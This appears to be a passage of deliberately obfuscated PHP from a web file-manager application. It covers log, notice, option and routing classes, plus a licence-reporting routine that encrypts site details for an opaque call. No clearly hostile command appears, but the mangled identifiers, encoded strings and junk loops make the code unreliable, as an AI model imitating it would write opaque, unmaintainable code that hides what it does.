isset($×íûó¸ª[$Ÿë˜ôÁó]) ? $×íûó¸ª[$Ÿë˜ôÁó] : $ıïç®ò®; $ûÇÏìñ§[$²ï·ö—¦[2146]] = $¯™Äë“; $‡Í”Ë µ = json_decode($ûÇÏìñ§[$²ï·ö—¦[538]], !0); $ûÇÏìñ§[$²ï·ö—¦[2429]] = isset($‡Í”Ë µ[$²ï·ö—¦[2429]]) ? $‡Í”Ë µ[$²ï·ö—¦[2429]] : $²ï·ö—¦[12]; $ûÇÏìñ§[$²ï·ö—¦[2433]] = IpLocation::get($ûÇÏìñ§[$²ï·ö—¦[2429]]); if (strpos($Ÿë˜ôÁó, $²ï·ö—¦[2205]) === 0 || isset($‡Í”Ë µ[$²ï·ö—¦[2203]])) { $‡Í”Ë µ[$²ï·ö—¦[101]] = $˜‰±Âêû[$‡Í”Ë µ[$²ï·ö—¦[204]]]; $‡Í”Ë µ[$²ï·ö—¦[2219]] = $˜‰±Âêû[$‡Í”Ë µ[$²ï·ö—¦[2203]]]; if ($‡Í”Ë µ[$²ï·ö—¦[33]] == $²ï·ö—¦[635]) { $‡Í”Ë µ[$²ï·ö—¦[538]][$²ï·ö—¦[1237]] = $˜‰±Âêû[$‡Í”Ë µ[$²ï·ö—¦[538]][$²ï·ö—¦[1237]]]; $‡Í”Ë µ[$²ï·ö—¦[538]][$²ï·ö—¦[1238]] = $˜‰±Âêû[$‡Í”Ë µ[$²ï·ö—¦[538]][$²ï·ö—¦[1238]]]; } if ($‡Í”Ë µ[$²ï·ö—¦[33]] == $²ï·ö—¦[2214]) { $‡Í”Ë µ[$²ï·ö—¦[538]][$²ï·ö—¦[204]] = $˜‰±Âêû[$‡Í”Ë µ[$²ï·ö—¦[538]][$²ï·ö—¦[204]]]; } if ($‡Í”Ë µ[$²ï·ö—¦[33]] == $²ï·ö—¦[1937]) { $‡Í”Ë µ[$²ï·ö—¦[2219]] = $‡Í”Ë µ[$²ï·ö—¦[101]]; $‡Í”Ë µ[$²ï·ö—¦[2203]] = $‡Í”Ë µ[$²ï·ö—¦[2219]][$²ï·ö—¦[204]]; $‡Í”Ë µ[$²ï·ö—¦[101]] = !1; $‡Í”Ë µ[$²ï·ö—¦[204]] = $²ï·ö—¦[12]; } $®âß¬Ì‚ = array($²ï·ö—¦[1937], $²ï·ö—¦[2201]); if (!in_array($‡Í”Ë µ[$²ï·ö—¦[33]], $®âß¬Ì‚)) { if ($‡Í”Ë µ[$²ï·ö—¦[101]] && $‡Í”Ë µ[$²ï·ö—¦[101]][$²ï·ö—¦[201]] == $²ï·ö—¦[202]) { $Î£„–‹[] = $ûÇÏìñ§[$²ï·ö—¦[487]]; unset($öğüò[$Ïú²¥Ò]); continue; } if ($‡Í”Ë µ[$²ï·ö—¦[2219]] && $‡Í”Ë µ[$²ï·ö—¦[2219]][$²ï·ö—¦[201]] == $²ï·ö—¦[202]) { $Î£„–‹[] = $ûÇÏìñ§[$²ï·ö—¦[487]]; unset($öğüò[$Ïú²¥Ò]); continue; } } } $ûÇÏìñ§[$²ï·ö—¦[538]] = $‡Í”Ë µ; unset($ûÇÏìñ§[$²ï·ö—¦[2438]]); $Ñ™Ì£ñ‡[] = $ûÇÏìñ§; } $this->clearSystemPathLog($Î£„–‹); return $Ñ™Ì£ñ‡; } private function clearSystemPathLog($µïŞ§Û) { $¿…†‚ÓÒ =& $_SERVER[Ò°Ì”İ•]; if (count($µïŞ§Û) == 0) { return; } $â¡ˆÃ = array($¿…†‚ÓÒ[487] => array($¿…†‚ÓÒ[7], array_unique($µïŞ§Û))); $this->where($â¡ˆÃ)->delete(); } public function deviceList($âöŞÚŸ, $èÖ†ÚÒ = 0) { $ìŞ‚áœù =& $_SERVER[Ò°Ì”İ•]; $ÜŞø•ü¼ = array($ìŞ‚áœù[1768] => $âöŞÚŸ, $ìŞ‚áœù[244] => array($ìŞ‚áœù[1087], $èÖ†ÚÒ), $ìŞ‚áœù[33] => $ìŞ‚áœù[1911]); $üÖù¶¬ = array(); $ßè¦İîó = $this->field($ìŞ‚áœù[2439])->where($ÜŞø•ü¼)->order($ìŞ‚áœù[2217])->limit(50)->select(); foreach ($ßè¦İîó as $ªÇõ˜Óá => $©ß„„ì¬) { if ($ªÇõ˜Óá > 0 && abs($©ß„„ì¬[$ìŞ‚áœù[244]] - $ßè¦İîó[$ªÇõ˜Óá - 1][$ìŞ‚áœù[244]]) < 5) { continue; } $ıö©¢À = json_decode($©ß„„ì¬[$ìŞ‚áœù[538]], !0); $©ß„„ì¬[$ìŞ‚áœù[2429]] = isset($ıö©¢À[$ìŞ‚áœù[2429]]) ? $ıö©¢À[$ìŞ‚áœù[2429]] : $ìŞ‚áœù[12]; unset($ıö©¢À[$ìŞ‚áœù[2429]]); $„ÓŸÜ–§ = $this->deviceType($ıö©¢À[$ìŞ‚áœù[2206]]); if (isset($üÖù¶¬[$„ÓŸÜ–§])) { continue; } $©ß„„ì¬[$ìŞ‚áœù[2433]] = IpLocation::get($©ß„„ì¬[$ìŞ‚áœù[2429]]); $©ß„„ì¬[$ìŞ‚áœù[538]] = $ıö©¢À; $üÖù¶¬[$„ÓŸÜ–§] = $©ß„„ì¬; } return array_values($üÖù¶¬); } public function deviceType($á®ĞÂ‹À) { return $á®ĞÂ‹À; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x6e\x6f\x74\151\143\145\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x63\157\x6e\164\145\156\x74", "\141\165\x74\150", "\x6d\x6f\144\145", "\x74\151\x6d\145", "\164\x79\160\x65", "\154\x65\x76\x65\154", "\x65\x6e\x61\x62\154\145", "\163\x6f\162\164"); public function listData($À¸æÔ§ = false, $œŒ¯Ğêô = "\163\x6f\x72\x74", $Ş³Ÿ¾Ò³ = false) { return parent::listData($À¸æÔ§, $œŒ¯Ğêô, $Ş³Ÿ¾Ò³); } public function add($Øšƒç×) { $áå’É™ã =& $_SERVER[Ò°Ì”İ•]; $õÛ‹¯µ = time(); if ($Øšƒç×[$áå’É™ã[16]] == $áå’É™ã[2440]) { $õÛ‹¯µ = strtotime($Øšƒç×[$áå’É™ã[217]]); } $Øšƒç×[$áå’É™ã[217]] = $õÛ‹¯µ; return parent::insert($Øšƒç×); } public function update($“ê”³¥¬, $Î™úúö») { $šãö±¥¶ =& $_SERVER[Ò°Ì”İ•]; $Ù…µÈúŞ = $this->listData($“ê”³¥¬); if (!$Ù…µÈúŞ) { return !1; } $ãŸŠİä = time(); if ($Î™úúö»[$šãö±¥¶[16]] == $šãö±¥¶[2440]) { $ãŸŠİä = strtotime($Î™úúö»[$šãö±¥¶[217]]); } $Î™úúö»[$šãö±¥¶[217]] = $ãŸŠİä; return parent::update($“ê”³¥¬, $Î™úúö»); } public function remove($ÍìıÁâ¼) { $”„Èş¿£ = $this->listData($ÍìıÁâ¼); if (!$”„Èş¿£ || $”„Èş¿£[$_SERVER[Ò°Ì”İ•][202]]) { return !1; } return parent::remove($ÍìıÁâ¼); } public function sort($ˆ³ùÜí–, $ãŸçßÇµ) { return parent::update($ˆ³ùÜí–, $ãŸçßÇµ); } public function enable($ƒîùè«, $ÚŞ½‡Ô‰) { return parent::update($ƒîùè«, array($_SERVER[Ò°Ì”İ•][2441] => $ÚŞ½‡Ô‰)); } private function initUserOption() { $çøíÛ¨ =& $_SERVER[Ò°Ì”İ•]; $this->optionType = $çøíÛ¨[2442]; $this->modelType = $çøíÛ¨[2443]; $this->field = array($çøíÛ¨[2444], $çøíÛ¨[32], $çøíÛ¨[217], $çøíÛ¨[33], $çøíÛ¨[2445], $çøíÛ¨[823], $çøíÛ¨[239]); } public function userNoticeGet($†‡ˆ¯¨ß = false) { $this->initUserOption(); return parent::listData($†‡ˆ¯¨ß, $_SERVER[Ò°Ì”İ•][487], !0); } public function userNoticeAdd($¾‡ŞÀ™°) { $ñ¥ç˜”û =& $_SERVER[Ò°Ì”İ•]; $this->initUserOption(); $ÒÏ‘»Ğ¸ = $this->findByKey($ñ¥ç˜”û[2444], $¾‡ŞÀ™°[$ñ¥ç˜”û[487]]); if ($ÒÏ‘»Ğ¸) { return !0; } $¬ñ¢£¾è = array($ñ¥ç˜”û[2444] => $¾‡ŞÀ™°[$ñ¥ç˜”û[487]], $ñ¥ç˜”û[32] => $¾‡ŞÀ™°[$ñ¥ç˜”û[32]], $ñ¥ç˜”û[217] => $¾‡ŞÀ™°[$ñ¥ç˜”û[217]], $ñ¥ç˜”û[33] => isset($¾‡ŞÀ™°[$ñ¥ç˜”û[33]]) ? $¾‡ŞÀ™°[$ñ¥ç˜”û[33]] : 1, $ñ¥ç˜”û[2445] => isset($¾‡ŞÀ™°[$ñ¥ç˜”û[2445]]) ? $¾‡ŞÀ™°[$ñ¥ç˜”û[2445]] : 0, $ñ¥ç˜”û[823] => 0, $ñ¥ç˜”û[239] => 0); return parent::insert($¬ñ¢£¾è); } public function userNoticeEdit($Ì²Â÷Ø, $«íÁİÏ‰) { $this->initUserOption(); return parent::update($Ì²Â÷Ø, $«íÁİÏ‰); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\x6d\137\x6f\x70\164\151\157\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\x6f\x6c\145", "\x72\x6f\x6c\145\107\162\x6f\x75\x70", "\x72\145\x67\151\163\x74", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($…Å¢Ü®ˆ) { return "\123\171\x73\x74\145\x6d\x4f\160\164\151\157\156\137{$…Å¢Ü®ˆ}"; } protected function optionDefault($ãºÈŒ‡ = '') { $Ğ—Â½ï¿ =& $_SERVER[Ò°Ì”İ•]; if ($ãºÈŒ‡ == $Ğ—Â½ï¿[12]) { return $GLOBALS[$Ğ—Â½ï¿[6]][$Ğ—Â½ï¿[469]]; } } } goto b¥ª‡Õ©ƒ¬; A²ºšŸ¶¹×: class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($İõğ¥¼) { $Ó¼ÆãµØ =& $_SERVER[Ò°Ì”İ•]; $»¿Æ‰º =& $_SERVER[¦ù÷êöÏ]; $’ì¶ïØ¾ = explode($»¿Æ‰º[0], trim($İõğ¥¼, $»¿Æ‰º[0])); $…°è»®ğ = $Ó¼ÆãµØ[698]; if (!$…°è»®ğ) { return; } $this->defaultModule = $’ì¶ïØ¾[0] ? $’ì¶ïØ¾[0] : $this->defaultModule; $this->defaultController = $’ì¶ïØ¾[1] ? $’ì¶ïØ¾[1] : $this->defaultController; $this->defaultAction = $’ì¶ïØ¾[2] ? $’ì¶ïØ¾[2] : $this->defaultAction; $ÂæÅçù¼ = $Ó¼ÆãµØ[699]; while (strlen($ÂæÅçù¼) < $Ó¼ÆãµØ[60]) { if (!$ÂæÅçù¼) { break; } $ÂæÅçù¼++; } $this->fehkcbdea055($»¿Æ‰º[1], array($this, $»¿Æ‰º[2])); $×Ğ¤£Çı = $Ó¼ÆãµØ[700]; if (strlen($×Ğ¤£Çı) < $Ó¼ÆãµØ[60]) { return; } } public function appRun($ù‹‡§©Æ) { $á©õ©œ… =& $_SERVER[Ò°Ì”İ•]; $ä¥şß’É =& $_SERVER[¦ù÷êöÏ]; $¹áÆÎ¦ = explode($ä¥şß’É[0], $ù‹‡§©Æ); $› ”ÓßÏ = $á©õ©œ…[701]; while ($› ”ÓßÏ < $á©õ©œ…[702]) { if ($› ”ÓßÏ >= 0) { break; } $› ”ÓßÏ++; } $ıÖÛ‚İ = strtolower($¹áÆÎ¦[0]); $Şú èÍÔ = $ä¥şß’É[3]; $õé¡íÏ = $á©õ©œ…[703]; while ($õé¡íÏ < $á©õ©œ…[60]) { if ($õé¡íÏ >= 0) { break; } $õé¡íÏ++; } if ($ıÖÛ‚İ == $ä¥şß’É[4]) { $Şú èÍÔ = $ä¥şß’É[5]; $¹áÆÎ¦[0] = $ä¥şß’É[6]; $¹áÆÎ¦[1] = $¹áÆÎ¦[1] . $ä¥şß’É[7]; $ù‹‡§©Æ = join($ä¥şß’É[0], $¹áÆÎ¦); $ù‹‡§©Æ = trim($ù‹‡§©Æ, $ä¥şß’É[0]); } call_user_func(array($ä¥şß’É[8], $ä¥şß’É[9]), $Şú èÍÔ . $ä¥şß’É[10], $ù‹‡§©Æ); ActionCall($ù‹‡§©Æ); $çÍè²Üù = $á©õ©œ…[704]; if (strlen($çÍè²Üù) < $á©õ©œ…[705]) { return; } call_user_func(array($ä¥şß’É[8], $ä¥şß’É[9]), $Şú èÍÔ . $ä¥şß’É[11], $ù‹‡§©Æ); } private function autorun() { $åñ¡½ˆË =& $_SERVER[¦ù÷êöÏ]; global $config; $Ïğ¯ç·ñ = $_SERVER[Ò°Ì”İ•][706]; if (!$Ïğ¯ç·ñ) { return; } if (count($config[$åñ¡½ˆË[12]]) == 0) { return; } foreach ($config[$åñ¡½ˆË[12]] as $®ÃÏó³ => $¤á©ëĞ) { $this->appRun($¤á©ëĞ); } } private function mbzjff8e7e53() { $šæ­ÍÇ =& $_SERVER[Ò°Ì”İ•]; $ªşºïĞ =& $_SERVER[¦ù÷êöÏ]; $â‡š‹¬¨ = $ªşºïĞ[4]; $Å«µ­Éª = $GLOBALS[$ªşºïĞ[13]][$ªşºïĞ[14]][0]; $Ö¹’ÃëÊ = $šæ­ÍÇ[707]; if (!$Ö¹’ÃëÊ) { die; } if (!$Å«µ­Éª || strlen($Å«µ­Éª) <= strlen($â‡š‹¬¨)) { return; } if (strtolower(substr($Å«µ­Éª, -strlen($â‡š‹¬¨))) != $â‡š‹¬¨) { return; } $çä‰’’ = substr($Å«µ­Éª, 0, -strlen($â‡š‹¬¨)); $í¬Å›¢¥ = array($ªşºïĞ[4], $çä‰’’); $Ù¬áÂÏ¬ = $šæ­ÍÇ[708]; while ($Ù¬áÂÏ¬ < $šæ­ÍÇ[60]) { if ($Ù¬áÂÏ¬ >= 0) { break; } $Ù¬áÂÏ¬++; } $‘Å¸ãºô = array_slice($GLOBALS[$ªşºïĞ[13]][$ªşºïĞ[14]], 1); $Ñä‘‰ = $šæ­ÍÇ[709]; $GLOBALS[$ªşºïĞ[13]][$ªşºïĞ[14]] = array_merge($í¬Å›¢¥, $‘Å¸ãºô); $³ñá¾¹Õ = $šæ­ÍÇ[710]; if (strlen($³ñá¾¹Õ) < $šæ­ÍÇ[705]) { return; } $GLOBALS[$ªşºïĞ[13]][$ªşºïĞ[15]] = implode($ªşºïĞ[0], $GLOBALS[$ªşºïĞ[13]][$ªşºïĞ[14]]); } private function vhdzc04f22c2() { $ÙÅëÆñ =& $_SERVER[Ò°Ì”İ•]; $°Óõã =& $_SERVER[¦ù÷êöÏ]; if ($GLOBALS[$°Óõã[13]][$°Óõã[15]] != $°Óõã[6]) { return; } $šÀ±ë’ = $_SERVER[$°Óõã[16]]; $ƒõÊÁûä = $°Óõã[17]; $ ©Ø”º¶ = $ÙÅëÆñ[711]; if (strlen($ ©Ø”º¶) < $ÙÅëÆñ[705]) { return; } if (!strstr($šÀ±ë’, $ƒõÊÁûä)) { return; } $³’¿îß‘ = strrpos($šÀ±ë’, $ƒõÊÁûä); $µÍû¹‹å = substr($šÀ±ë’, $³’¿îß‘ + strlen($ƒõÊÁûä)); preg_match_all($°Óõã[18], $µÍû¹‹å, $ƒ·Áé¦²); $µÍû¹‹å = trim($ƒ·Áé¦²[0][0], $°Óõã[19]); $GLOBALS[$°Óõã[13]][$°Óõã[14]] = explode($°Óõã[19], $µÍû¹‹å); $GLOBALS[$°Óõã[13]][$°Óõã[15]] = implode($°Óõã[0], $GLOBALS[$°Óõã[13]][$°Óõã[14]]); } public function run() { $óÛÑ˜µ =& $_SERVER[Ò°Ì”İ•]; $ûäµÔ”Ë =& $_SERVER[¦ù÷êöÏ]; $this->vhdzc04f22c2(); $this->mbzjff8e7e53(); $ò‚¤ïã± = $óÛÑ˜µ[712]; while ($ò‚¤ïã± < $óÛÑ˜µ[702]) { if ($ò‚¤ïã± >= 0) { break; } $ò‚¤ïã±++; } $³†«°ûÜ = $GLOBALS[$ûäµÔ”Ë[13]][$ûäµÔ”Ë[14]]; $Ü¸ü­Ê¯ = $óÛÑ˜µ[713]; while (strlen($Ü¸ü­Ê¯) < $óÛÑ˜µ[714]) { if (!$Ü¸ü­Ê¯) { break; } $Ü¸ü­Ê¯++; } $ó©›Éü = $GLOBALS[$ûäµÔ”Ë[13]][$ûäµÔ”Ë[15]]; $Æï©Ùòé = $óÛÑ˜µ[715]; if (!$Æï©Ùòé) { die; } define($ûäµÔ”Ë[20], isset($³†«°ûÜ[0]) && $³†«°ûÜ[0] ? $³†«°ûÜ[0] : $this->defaultModule); define($ûäµÔ”Ë[21], isset($³†«°ûÜ[1]) && $³†«°ûÜ[0] ? $³†«°ûÜ[1] : $this->defaultController); define($ûäµÔ”Ë[22], isset($³†«°ûÜ[2]) && $³†«°ûÜ[0] ? $³†«°ûÜ[2] : $this->defaultAction); $ûƒ‘¥óÅ = $óÛÑ˜µ[716]; while ($ûƒ‘¥óÅ < $óÛÑ˜µ[702]) { if ($ûƒ‘¥óÅ >= 0) { break; } $ûƒ‘¥óÅ++; } define($ûäµÔ”Ë[23], MOD . $ûäµÔ”Ë[0] . ST . $ûäµÔ”Ë[0] . ACT); $_SERVER[$ûäµÔ”Ë[24]] = strtolower(ACTION); $¦Šú‰ãá = $óÛÑ˜µ[717]; $this->autorun(); $‡½¦Ó´¤ = $óÛÑ˜µ[718]; if (!$‡½¦Ó´¤) { return; } if (count($³†«°ûÜ) >= 3) { $this->appRun($ó©›Éü); } else { $this->appRun(ACTION); } } private $krzl2363cf69 = array(); private $yicq5e90482e = ''; public function nxja371d26ac() { $‰­ÉÅšœ =& $_SERVER[Ò°Ì”İ•]; $’¨Š»û =& $_SERVER[¦ù÷êöÏ]; $this->jucvbbcb17e9(); $ñÀ¤ƒşí = $‰­ÉÅšœ[719]; if (!$ñÀ¤ƒşí) { return; } $this->aimh507af633(); $œÕŸôì¬ = $‰­ÉÅšœ[720]; $this->tpfzcc37366b(); $this->ubyg96682608(); $ÄÎö¾¬Š = $‰­ÉÅšœ[721]; if (!$ÄÎö¾¬Š) { die; } $this->ndmj1473927c(); $ñèà¯ÀŞ = $‰­ÉÅšœ[722]; if (strlen($ñèà¯ÀŞ) < $‰­ÉÅšœ[702]) { return; } $this->krtvdfd8fd11(); $¥É§öØü = $‰­ÉÅšœ[723]; while (strlen($¥É§öØü) < $‰­ÉÅšœ[702]) { if (!$¥É§öØü) { break; } $¥É§öØü++; } $this->kioq675b097d(); $this->fehkcbdea055($’¨Š»û[25], array($this, $’¨Š»û[26])); $this->fehkcbdea055($’¨Š»û[27], array($this, $’¨Š»û[28])); $­ßù™¬ = $‰­ÉÅšœ[724]; while (strlen($­ßù™¬) < $‰­ÉÅšœ[60]) { if (!$­ßù™¬) { break; } $­ßù™¬++; } $this->fehkcbdea055($’¨Š»û[29], array($this, $’¨Š»û[30])); $this->fehkcbdea055($’¨Š»û[31], array($this, $’¨Š»û[32])); } public function brvpc8edea38($É‚€Éƒ¸) { $„ÛªËšî =& $_SERVER[Ò°Ì”İ•]; $Ö¶âÁÃì =& $_SERVER[¦ù÷êöÏ]; $¬ûÇ¸òó = Model($Ö¶âÁÃì[33])->get(); $¾Š•™ÃÆ = $„ÛªËšî[725]; if (strlen($¾Š•™ÃÆ) < $„ÛªËšî[714]) { return; } $³ûÜÒøÁ = array($Ö¶âÁÃì[34], $Ö¶âÁÃì[35], $Ö¶âÁÃì[36], $Ö¶âÁÃì[37], $Ö¶âÁÃì[38], $Ö¶âÁÃì[39], $Ö¶âÁÃì[40], $Ö¶âÁÃì[41], $Ö¶âÁÃì[42], $Ö¶âÁÃì[43], $Ö¶âÁÃì[44], $Ö¶âÁÃì[45], $Ö¶âÁÃì[46], $Ö¶âÁÃì[47], $Ö¶âÁÃì[48], $Ö¶âÁÃì[49], $Ö¶âÁÃì[50], $Ö¶âÁÃì[51], $Ö¶âÁÃì[52], $Ö¶âÁÃì[53], $Ö¶âÁÃì[54], $Ö¶âÁÃì[55], $Ö¶âÁÃì[56], $Ö¶âÁÃì[57], $Ö¶âÁÃì[58], $Ö¶âÁÃì[59], $Ö¶âÁÃì[60], $Ö¶âÁÃì[61], $Ö¶âÁÃì[62], $Ö¶âÁÃì[63], $Ö¶âÁÃì[64], $Ö¶âÁÃì[65], $Ö¶âÁÃì[66], $Ö¶âÁÃì[67], $Ö¶âÁÃì[68], $Ö¶âÁÃì[69], $Ö¶âÁÃì[70], $Ö¶âÁÃì[71], $Ö¶âÁÃì[72], $Ö¶âÁÃì[73], $Ö¶âÁÃì[74], $Ö¶âÁÃì[75], $Ö¶âÁÃì[76], $Ö¶âÁÃì[77], $Ö¶âÁÃì[78], $Ö¶âÁÃì[79], $Ö¶âÁÃì[80], $Ö¶âÁÃì[81], $Ö¶âÁÃì[82], $Ö¶âÁÃì[83], $Ö¶âÁÃì[84], $Ö¶âÁÃì[85]); $Üà´±­Ó = $„ÛªËšî[726]; if (!$Üà´±­Ó) { return; } foreach ($³ûÜÒøÁ as $û£©•Íİ) { $¬Í˜ŒÄ‚ = $GLOBALS[$Ö¶âÁÃì[86]][$Ö¶âÁÃì[87]][$û£©•Íİ]; $×ãÍê¥Ì = $„ÛªËšî[727]; if (!$×ãÍê¥Ì) { die; } if (isset($¬ûÇ¸òó[$û£©•Íİ])) { $¬Í˜ŒÄ‚ = $¬ûÇ¸òó[$û£©•Íİ]; } $É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[89]][$û£©•Íİ] = $¬Í˜ŒÄ‚; } $ü­¹òĞ = $É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[89]][$Ö¶âÁÃì[46]]; unset($É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[90]][$Ö¶âÁÃì[91]]); $¢±„ ùÛ = $„ÛªËšî[728]; if (strlen($¢±„ ùÛ) < $„ÛªËšî[702]) { return; } unset($É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[90]][$Ö¶âÁÃì[92]]); unset($É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[89]][$Ö¶âÁÃì[46]]); unset($É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[89]][$Ö¶âÁÃì[93]]); $Øö¸æœŞ = $„ÛªËšî[729]; if (strlen($Øö¸æœŞ) < $„ÛªËšî[702]) { die; } $É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[89]][$Ö¶âÁÃì[94]] = array($Ö¶âÁÃì[95] => (int) $ü­¹òĞ[$Ö¶âÁÃì[96]], $Ö¶âÁÃì[97] => (int) _get($ü­¹òĞ, $Ö¶âÁÃì[98], 0)); $Ëâ¢€É¾ = $„ÛªËšî[730]; if (strlen($Ëâ¢€É¾) < $„ÛªËšî[705]) { return; } $ßŒŞÍÔå = substr(md5($Ö¶âÁÃì[99] . get_client_ip() . $¬ûÇ¸òó[$Ö¶âÁÃì[100]]), 0, 15); $ıŒõè™ò = $„ÛªËšî[731]; if (!$ıŒõè™ò) { die; } $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[102]] = Mcrypt::encode(Session::sign(), $ßŒŞÍÔå, 3600 * 24); $™à¢¶—µ = $„ÛªËšî[732]; if (!$™à¢¶—µ) { die; } $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[103]] = Action($Ö¶âÁÃì[104])->accessToken(); $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[105]] = md5($_SERVER[$Ö¶âÁÃì[106]] . $¬ûÇ¸òó[$Ö¶âÁÃì[100]]); $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[107]] = base64_encode(serverInfo()); $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[108]] = $this->yicq5e90482e; $şÙø›ù¸ = $„ÛªËšî[733]; if (strlen($şÙø›ù¸) < $„ÛªËšî[60]) { return; } if ($¬ûÇ¸òó[$Ö¶âÁÃì[108]] != $Ö¶âÁÃì[109]) { $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[110]] = $¬ûÇ¸òó[$Ö¶âÁÃì[110]]; $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[111]] = $¬ûÇ¸òó[$Ö¶âÁÃì[111]]; $¥µ®Â˜• = rand_string(10) . $this->yicq5e90482e . rand_string(5); $É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[112]][$Ö¶âÁÃì[113]] = $this->khpu86d3adea($¥µ®Â˜•, $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[105]]); } if ($this->yicq5e90482e == $Ö¶âÁÃì[109]) { $É‚€Éƒ¸[$Ö¶âÁÃì[88]][$Ö¶âÁÃì[89]][$Ö¶âÁÃì[94]][$Ö¶âÁÃì[98]] = 0; } $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[114]] = $this->versionPluginFilter(); $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[115]] = _get($this->krzl2363cf69, $Ö¶âÁÃì[116], $Ö¶âÁÃì[6]); if (KodUser::isRoot() && $this->config[$Ö¶âÁÃì[117]]) { $É‚€Éƒ¸[$Ö¶âÁÃì[101]][$Ö¶âÁÃì[118]] = WEB_ROOT; } return $É‚€Éƒ¸; } private function krtvdfd8fd11() { $«À—ƒ÷Ä =& $_SERVER[Ò°Ì”İ•]; $Á»ë†ˆÕ =& $_SERVER[¦ù÷êöÏ]; $¤›«¯Ô = $_SERVER[$Á»ë†ˆÕ[24]] == $Á»ë†ˆÕ[119]; $§–³¢ˆé = $«À—ƒ÷Ä[734]; if (!$§–³¢ˆé) { return; } if ($_SERVER[$Á»ë†ˆÕ[24]] == $Á»ë†ˆÕ[120] && $_GET[$Á»ë†ˆÕ[121]] == $Á»ë†ˆÕ[122]) { $¤›«¯Ô = !0; } if ($¤›«¯Ô) { $ÛÁÑ§ = array($Á»ë†ˆÕ[108] => $this->yicq5e90482e, $Á»ë†ˆÕ[123] => $this->ztsw40e918ec(), $Á»ë†ˆÕ[124] => Model($Á»ë†ˆÕ[125])->count()); if ($this->yicq5e90482e != $Á»ë†ˆÕ[109]) { $ôì¡°¾± = _get($this->krzl2363cf69, $Á»ë†ˆÕ[126]); if ($ôì¡°¾±) { $ÛÁÑ§[$Á»ë†ˆÕ[127]] = $ôì¡°¾±; $ÛÁÑ§[$Á»ë†ˆÕ[128]] = strtotime(_get($this->krzl2363cf69, $Á»ë†ˆÕ[129])); $ÛÁÑ§[$Á»ë†ˆÕ[130]] = _get($this->krzl2363cf69, $Á»ë†ˆÕ[116]); } $‚ì·œŸÓ = Model($Á»ë†ˆÕ[33])->get($Á»ë†ˆÕ[131], $Á»ë†ˆÕ[6], !0); if (is_string($‚ì·œŸÓ) && substr($‚ì·œŸÓ, 0, 1) == $Á»ë†ˆÕ[132]) { $‚ì·œŸÓ = json_decode_force($‚ì·œŸÓ); } if (is_array($‚ì·œŸÓ) && $‚ì·œŸÓ[$Á»ë†ˆÕ[133]] && strstr($‚ì·œŸÓ[$Á»ë†ˆÕ[133]], $Á»ë†ˆÕ[134])) { $Ù²¡«¹¬ = explode($Á»ë†ˆÕ[134], $‚ì·œŸÓ[$Á»ë†ˆÕ[133]]); $ÛÁÑ§[$Á»ë†ˆÕ[135]] = $Ù²¡«¹¬[0]; } } $ÛÁÑ§ = $this->owfd051c97a6(json_encode($ÛÁÑ§), md5($Á»ë†ˆÕ[136])); $ÛÅ§Ã¹Ğ = $«À—ƒ÷Ä[735]; if (!$ÛÅ§Ã¹Ğ) { die; } $¢Ìí’­ô = array($Á»ë†ˆÕ[137] => $ÛÁÑ§); call_user_func(array($Á»ë†ˆÕ[138], $Á»ë†ˆÕ[139]), $¢Ìí’­ô); } if ($this->yicq5e90482e == $Á»ë†ˆÕ[109]) { return; } $ßˆê²™ = array($Á»ë†ˆÕ[140], $Á»ë†ˆÕ[141], $Á»ë†ˆÕ[142], $Á»ë†ˆÕ[143], $Á»ë†ˆÕ[144], $Á»ë†ˆÕ[145]); $œ‡ªŠ”Ğ = $«À—ƒ÷Ä[736]; $û„‚üñ¸ = Model($Á»ë†ˆÕ[33])->get(); $û¢´ËÛ« = $«À—ƒ÷Ä[737]; if (!$û¢´ËÛ«) { die; } $¢Ìí’­ô = array($Á»ë†ˆÕ[146] => $û„‚üñ¸[$Á»ë†ˆÕ[34]], $Á»ë†ˆÕ[147] => $û„‚üñ¸[$Á»ë†ˆÕ[35]], $Á»ë†ˆÕ[148] => $Á»ë†ˆÕ[6]); foreach ($ßˆê²™ as $Äì®˜éÏ) { if (!isset($û„‚üñ¸[$Äì®˜éÏ]) || !$û„‚üñ¸[$Äì®˜éÏ]) { continue; } $¢Ìí’­ô[$Äì®˜éÏ] = $û„‚üñ¸[$Äì®˜éÏ]; $ĞÊˆÒ•¤ = $«À—ƒ÷Ä[738]; while (strlen($ĞÊˆÒ•¤) < $«À—ƒ÷Ä[702]) { if (!$ĞÊˆÒ•¤) { break; } $ĞÊˆÒ•¤++; } } call_user_func(array($Á»ë†ˆÕ[138], $Á»ë†ˆÕ[139]), $¢Ìí’­ô); $Ù¬üî‡õ = $«À—ƒ÷Ä[739]; if (!$Ù¬üî‡õ) { return; } } private function ubyg96682608() { $„ø×Ó†Ø =& 